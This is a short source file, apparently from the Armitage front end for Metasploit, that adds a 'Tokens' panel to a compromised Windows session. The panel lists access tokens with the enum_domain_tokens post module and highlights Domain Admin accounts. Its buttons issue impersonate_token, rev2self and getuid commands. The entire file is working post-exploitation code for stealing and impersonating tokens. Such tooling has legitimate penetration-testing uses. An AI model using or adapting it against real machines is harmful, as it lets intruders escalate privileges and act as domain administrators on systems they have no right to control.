#
# Token Stealing...
#

import java.awt.*;
import java.awt.event.*;

import javax.swing.*;

sub updateTokenList {
	local('$queue');
	$queue = [new armitage.ConsoleQueue: $client];
	[$queue addCommand: $null, "use post/windows/gather/enum_domain_tokens"];
	[$queue addCommand: $null, "set SESSION $1"];
	[$queue addCommand: "x", "run"];

	[$3 setEnabled: 0];
	[$3 setText: "Grabbing tokens..."];

	[$queue addListener: lambda({
		local('@rows $row');

		@rows = parseTextTable($3, @("Token Type", "Account Type", "Name", "Domain Admin"));
		[$model clear: size(@rows)];
		foreach $row (@rows) {
			[$model addEntry: $row];
		}
		[$model fireListeners];

		dispatchEvent(lambda({
			[$refresh setEnabled: 1];
			[$refresh setText: "Refresh"];
		}, \$refresh));

		[$queue stop];
	}, $model => $2, $refresh => $3, \$queue)];
	[$queue start];
}

sub stealToken {
        local('$dialog $table $model $steal $revert $whoami $refresh');
        $dialog = [new JPanel];
        [$dialog setLayout: [new BorderLayout]];

        ($table, $model) = setupTable("Name", @("Token Type", "Account Type", "Name", "Domain Admin"), @());
	[$table setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
        [$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$steal = [new JButton: "Steal Token"];
	[$steal addActionListener: lambda({
		local('$value');
		$value = [$model getSelectedValue: $table];
		oneTimeShow("impersonate_token");
		m_cmd($sid, "impersonate_token ' $+ $value $+ '");
	}, $sid => $1, \$table, \$model)];

	$revert = [new JButton: "Revert to Self"];
	[$revert addActionListener: lambda({
		oneTimeShow("getuid");
		m_cmd($sid, "rev2self");
		m_cmd($sid, "getuid");
	}, $sid => $1)];

	$whoami = [new JButton: "Get UID"];
	[$whoami addActionListener: lambda({
		oneTimeShow("getuid");
		m_cmd($sid, "getuid");
	}, $sid => $1)];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		updateTokenList($sid, $model, $refresh);
	}, $sid => $1, \$model, \$refresh)];

	updateTokenList($1, $model, $refresh);

        [$dialog add: center($steal, $revert, $whoami, $refresh), [BorderLayout SOUTH]];
        [$frame addTab: "Tokens $1", $dialog, $null, "Tokens " . sessionToHost($1)];
}
